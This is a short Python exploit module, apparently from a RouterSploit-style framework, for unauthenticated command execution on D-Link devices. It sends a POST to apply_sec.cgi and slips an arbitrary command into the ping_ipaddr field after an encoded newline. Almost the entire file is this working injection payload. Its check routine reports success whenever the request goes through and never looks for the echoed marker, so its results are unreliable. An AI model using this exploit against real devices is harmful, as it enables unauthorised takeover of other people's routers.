# rsf exploit module
# description: Module exploits unauthenticated RCE in D-Link products via PingTest CGI
import requests

def execute(target, port, cmd):
    try:
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": f"http://{target}:{port}/login_pic.asp",
        }
        data = {
            "html_response_page": "login_pic.asp",
            "action": "ping_test",
            "ping_ipaddr": f"127.0.0.1%0a{cmd}"
        }
        requests.post(f"http://{target}:{port}/apply_sec.cgi", headers=headers, data=data, timeout=5)
        return True
    except:
        return False

def check(target, port=80):
    try:
        mark = "test123"
        cmd = f"echo {mark}"
        if execute(target, port, cmd):
            return True
        return False
    except:
        return False
